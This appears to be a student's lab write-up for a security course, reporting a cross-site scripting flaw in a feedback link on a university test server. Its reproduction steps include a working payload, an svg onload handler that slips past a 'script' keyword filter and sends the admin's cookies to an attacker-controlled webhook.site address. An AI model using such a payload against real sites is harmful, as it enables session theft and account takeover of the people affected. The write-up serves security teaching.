# ist193587

## Vulnerabilty

Cross-site scripting.

## Where

On the link of the bug/feature part.

## Impact

Allows the user to execute script commands on the admin's browser in this case to get the cookies

## Steps to Reproduce

1. First I discovered where it could be executed, since the feedback portion says that what we say is gonna be shared with them i believed that there was a big chance that what was sent is gonna be read by a admin, with this in mind i used Webhook, to have a site i could control.
2. But in this case we knew that keywords like script were getting filtered out so i figured this type of payload might pass `<svg onload=window.location.replace("https://webhook.site/<random_identifier_you_were_given>?cookie=?cookie="+document.cookie)>` after url encoding it and adding it to `http://mustard.stt.rnl.tecnico.ulisboa.pt:22252/?search=` and we are able to get the admin's cookie.